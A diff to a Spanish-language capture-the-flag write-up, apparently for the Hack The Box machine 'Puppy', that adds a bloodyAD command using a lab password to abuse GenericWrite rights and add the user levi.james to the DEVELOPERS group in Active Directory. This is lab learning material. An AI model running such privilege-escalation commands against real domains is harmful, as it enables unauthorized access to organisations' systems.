@@ -138,5 +138,10 @@ bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'levi.james' -p 'KingofAkron2025!'
 
 ![[Pasted image 20250606145919.png]]
 
-efectivamente levi.james. no esta dentro de los usuarios pertenecientes a este grupo pero eso es irrelevante. Con el permiso de GenericWritela podemos reescribir la lista de invitados nosotros mismos.
+efectivamente levi.james. no esta dentro de los usuarios pertenecientes a este grupo pero con el permiso de GenericWritela podemos agregarlo a la lista de invitados nosotros mismos.
 
+```python
+❯ bloodyAD --host 10.10.11.70 -d 'puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'
+```
+
+![[Pasted image 20250606150659.png]]
